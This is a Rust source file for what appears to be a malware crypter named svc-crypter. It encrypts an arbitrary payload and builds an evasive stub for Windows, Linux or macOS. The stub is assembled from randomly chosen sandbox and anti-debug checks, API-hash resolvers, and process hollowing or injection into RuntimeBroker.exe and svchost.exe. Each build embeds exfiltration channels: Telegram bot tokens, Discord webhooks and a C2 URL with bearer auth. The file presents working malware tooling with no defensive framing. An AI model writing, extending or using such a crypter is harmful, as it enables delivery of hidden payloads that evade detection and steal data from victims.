use aes_gcm::{aead::{Aead, KeyInit, OsRng}, Aes256Gcm, Nonce};
use argon2::{Algorithm, Argon2, Params, Version};
use rand::RngCore;
use sha2::{Digest, Sha256};
use std::path::PathBuf;
use std::process::Command;

use crypter_ir::*;
use crypter_synth::Synth;

#[derive(serde::Deserialize, Default)]
struct SecretFile {
    #[serde(default)] telegram_token: String,
    #[serde(default)] telegram_chat: String,
    #[serde(default)] discord_webhook: String,
    #[serde(default)] c2_url: String,
    #[serde(default)] c2_auth: String,
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 {
        eprintln!("usage: svc-crypter <payload> [options]");
        eprintln!();
        eprintln!("options:");
        eprintln!("  --target windows|linux|macos   (default windows)");
        eprintln!("  --fp     <fingerprint.json>    bind key to host fingerprint");
        eprintln!("  --out    <name>                output basename (default svc)");
        eprintln!();
        eprintln!("  per-build exfil secrets (path 2):");
        eprintln!("  --cfg-file <secrets.json>      JSON with any of:");
        eprintln!("                                   telegram_token, telegram_chat,");
        eprintln!("                                   discord_webhook, c2_url, c2_auth");
        eprintln!("  --tg-token <TOKEN>             telegram bot token");
        eprintln!("  --tg-chat  <CHAT_ID>           telegram chat / channel id");
        eprintln!("  --discord  <WEBHOOK_URL>       discord webhook url");
        eprintln!("  --c2       <URL>               generic c2 endpoint");
        eprintln!("  --c2-auth  <BEARER>            bearer token for c2");
        std::process::exit(1);
    }

    let payload_path = PathBuf::from(&args[1]);
    let payload_bytes = std::fs::read(&payload_path).expect("read payload");

    let mut target_os = TargetOs::Windows;
    let mut fp_path: Option<PathBuf> = None;
    let mut out_name = "svc".to_string();

    // secrets — loaded from file first, overridden by CLI flags
    let mut secrets = SecretFile::default();

    let mut i = 2;
    while i < args.len() {
        match args[i].as_str() {
            "--target" => {
                if let Some(t) = args.get(i + 1) {
                    target_os = match t.as_str() {
                        "linux" => TargetOs::Linux,
                        "macos" => TargetOs::Macos,
                        _ => TargetOs::Windows,
                    };
                }
                i += 2;
            }
            "--fp" => { fp_path = args.get(i + 1).map(PathBuf::from); i += 2; }
            "--out" => { out_name = args.get(i + 1).cloned().unwrap_or_else(|| "svc".into()); i += 2; }
            "--cfg-file" => {
                if let Some(p) = args.get(i + 1) {
                    let raw = std::fs::read_to_string(p).unwrap_or_default();
                    secrets = serde_json::from_str(&raw).unwrap_or_default();
                }
                i += 2;
            }
            "--tg-token" => { secrets.telegram_token = args.get(i + 1).cloned().unwrap_or_default(); i += 2; }
            "--tg-chat"  => { secrets.telegram_chat  = args.get(i + 1).cloned().unwrap_or_default(); i += 2; }
            "--discord"  => { secrets.discord_webhook = args.get(i + 1).cloned().unwrap_or_default(); i += 2; }
            "--c2"       => { secrets.c2_url = args.get(i + 1).cloned().unwrap_or_default(); i += 2; }
            "--c2-auth"  => { secrets.c2_auth = args.get(i + 1).cloned().unwrap_or_default(); i += 2; }
            _ => i += 1,
        }
    }

    let mut seed = [0u8; 32];
    OsRng.fill_bytes(&mut seed);
    let mut xor_key = [0u8; 32];
    OsRng.fill_bytes(&mut xor_key);

    let mut rng = rand::thread_rng();
    use rand::Rng;

    let gates = pick_gates(&mut rng);
    let debug_check = pick_debug(&mut rng);
    let resolver = pick_resolver(&mut rng);
    let decrypt = pick_decrypt(&mut rng);
    let execution = pick_execution(&mut rng);
    let integrity = pick_integrity(&mut rng);
    let virtualization = rng.gen_bool(0.85);
    let anti_dump = rng.gen_bool(0.9);
    let anti_emulation = rng.gen_bool(0.9);
    let junk_density = rng.gen_range(0.3..0.7);

    // encrypt payload
    let mut salt = [0u8; 32];
    OsRng.fill_bytes(&mut salt);
    let mut nonce16 = [0u8; 16];
    OsRng.fill_bytes(&mut nonce16);

    let mut key_input = Vec::new();
    key_input.extend_from_slice(&salt);
    key_input.extend_from_slice(&seed);
    let mut p_hash = Sha256::new();
    p_hash.update(&payload_bytes);
    key_input.extend_from_slice(&p_hash.finalize());

    let params = Params::new(64 * 1024, 3, 1, Some(32)).expect("params");
    let a2 = Argon2::new(Algorithm::Argon2id, Version::V0x13, params);
    let mut key = [0u8; 32];
    a2.hash_password_into(&key_input, b"svc_crypter_v1", &mut key).expect("argon2");

    let cipher = Aes256Gcm::new((&key).into());
    let mut payload_nonce = [0u8; 12];
    OsRng.fill_bytes(&mut payload_nonce);
    let ct = cipher.encrypt(Nonce::from_slice(&payload_nonce), payload_bytes.as_slice()).expect("aead");
    let mut blob = Vec::with_capacity(12 + ct.len());
    blob.extend_from_slice(&payload_nonce);
    blob.extend_from_slice(&ct);

    let prog = StubProgram {
        seed,
        gates,
        debug_check,
        resolver,
        decrypt,
        virtualization,
        integrity,
        execution,
        key_material: KeyMaterial {
            salt: salt.to_vec(),
            nonce: nonce16.to_vec(),
            bind_to_fingerprint: fp_path.is_some(),
            bind_to_code_hash: true,
        },
        payload_blob: blob,
        target_os: target_os.clone(),
        config_xor_key: xor_key,
        anti_dump,
        anti_emulation,
        junk_density,

        telegram_token: secrets.telegram_token.clone(),
        telegram_chat: secrets.telegram_chat.clone(),
        discord_webhook: secrets.discord_webhook.clone(),
        c2_url: secrets.c2_url.clone(),
        c2_auth: secrets.c2_auth.clone(),
    };

    println!("[*] payload: {} ({} bytes)", payload_path.display(), payload_bytes.len());
    println!("[*] target: {:?}", target_os);
    println!("[*] gates: {:?}", prog.gates);
    println!("[*] debug: {:?}", prog.debug_check);
    println!("[*] resolver: {:?}", prog.resolver);
    println!("[*] decrypt: {:?}", prog.decrypt);
    println!("[*] exec: {:?}", prog.execution);
    println!("[*] virtualization: {}", virtualization);
    println!("[*] anti-dump: {}", anti_dump);
    println!("[*] anti-emulation: {}", anti_emulation);
    println!("[*] junk-density: {:.2}", junk_density);
    println!("[*] build seed: {}", hex::encode(seed));
    println!("[*] exfil secrets:");
    println!("    telegram_token: {}", mask(&prog.telegram_token));
    println!("    telegram_chat:  {}", mask(&prog.telegram_chat));
    println!("    discord:        {}", mask(&prog.discord_webhook));
    println!("    c2_url:         {}", mask(&prog.c2_url));
    println!("    c2_auth:        {}", mask(&prog.c2_auth));

    let mut synth = Synth::new(seed, xor_key);
    let source = synth.emit(&prog);

    let build_dir = PathBuf::from("out").join(&out_name);
    std::fs::create_dir_all(&build_dir).expect("mkdir");
    let src_path = build_dir.join("stub.rs");
    std::fs::write(&src_path, &source).expect("write stub");

    let target_triple = match target_os {
        TargetOs::Windows => "x86_64-pc-windows-gnu",
        TargetOs::Linux   => "x86_64-unknown-linux-gnu",
        TargetOs::Macos   => "aarch64-apple-darwin",
    };

    let out_bin = build_dir.join(format!("{}{}",
        out_name,
        if matches!(target_os, TargetOs::Windows) { ".exe" } else { "" }));

    println!("[*] compiling {} → {}", src_path.display(), out_bin.display());

    let status = Command::new("rustc")
        .args([
            "--edition", "2021", "-O",
            "-C", "panic=abort", "-C", "strip=symbols",
            "-C", "lto=fat", "-C", "codegen-units=1",
            "--target", target_triple,
            "-o", out_bin.to_str().unwrap(),
            src_path.to_str().unwrap(),
        ])
        .status()
        .expect("rustc");

    if !status.success() {
        eprintln!("[!] rustc failed");
        std::process::exit(1);
    }

    let bin = std::fs::read(&out_bin).unwrap_or_default();
    let mut h = Sha256::new();
    h.update(&bin);
    println!("[+] built: {} ({} bytes, sha256 {})",
        out_bin.display(), bin.len(), hex::encode(h.finalize()));
}

fn mask(s: &str) -> String {
    if s.is_empty() { return "(none)".into(); }
    if s.len() <= 8 { return "********".into(); }
    format!("{}…{}", &s[..4], &s[s.len()-4..])
}

fn pick_gates<R: rand::Rng>(rng: &mut R) -> Vec<Gate> {
    let mut gates = vec![
        Gate::SleepJitter {
            min_ms: rng.gen_range(15_000..45_000),
            max_ms: rng.gen_range(75_000..180_000),
        },
        Gate::SleepAccelerationCheck {
            sleep_ms: rng.gen_range(3000..6000),
            min_ratio: 0.8,
        },
        Gate::UptimeMin(rng.gen_range(180..900)),
        Gate::CursorMotion { samples: rng.gen_range(2..6) },
        Gate::UsernameBlocklist,
        Gate::HostnameBlocklist,
        Gate::ApiHammerCheck,
    ];
    if rng.gen_bool(0.7) { gates.push(Gate::RamMinMb(rng.gen_range(3000..6000))); }
    if rng.gen_bool(0.6) { gates.push(Gate::CpuCoresMin(rng.gen_range(2..4))); }
    if rng.gen_bool(0.4) { gates.push(Gate::DomainJoined); }
    gates
}

fn pick_debug<R: rand::Rng>(rng: &mut R) -> DebugCheck {
    match rng.gen_range(0..6) {
        0 => DebugCheck::IsDebuggerPresent,
        1 => DebugCheck::PEBBeingDebugged,
        2 => DebugCheck::NtGlobalFlag,
        3 => DebugCheck::NtQueryInformationProcess,
        4 => DebugCheck::TimingCheck { rounds: rng.gen_range(3..8) as u8 },
        _ => DebugCheck::NtQueryInformationProcess,
    }
}

fn pick_resolver<R: rand::Rng>(rng: &mut R) -> Resolver {
    match rng.gen_range(0..4) {
        0 => Resolver::ExportWalkFnv1a,
        1 => Resolver::ExportWalkCrc32,
        2 => Resolver::ExportWalkDjb2,
        _ => Resolver::PebWalk,
    }
}

fn pick_decrypt<R: rand::Rng>(rng: &mut R) -> DecryptScheme {
    match rng.gen_range(0..4) {
        0 => DecryptScheme::AesGcm,
        1 => DecryptScheme::ChaCha20Poly1305,
        2 => DecryptScheme::AesCbcHmac,
        _ => DecryptScheme::AesGcm,
    }
}

fn pick_execution<R: rand::Rng>(rng: &mut R) -> ExecutionMethod {
    match rng.gen_range(0..4) {
        0 => ExecutionMethod::ImageMap,
        1 => ExecutionMethod::ShellcodeInvoke,
        2 => ExecutionMethod::ProcessHollow { host: "C:\\Windows\\System32\\RuntimeBroker.exe".into() },
        _ => ExecutionMethod::SpawnInject { host: "C:\\Windows\\System32\\svchost.exe".into() },
    }
}

fn pick_integrity<R: rand::Rng>(rng: &mut R) -> IntegrityCheck {
    match rng.gen_range(0..3) {
        0 => IntegrityCheck::TextSectionHash,
        1 => IntegrityCheck::RegionCrc { start: 0x1000, len: rng.gen_range(2000..8000) },
        _ => IntegrityCheck::None,
    }
}
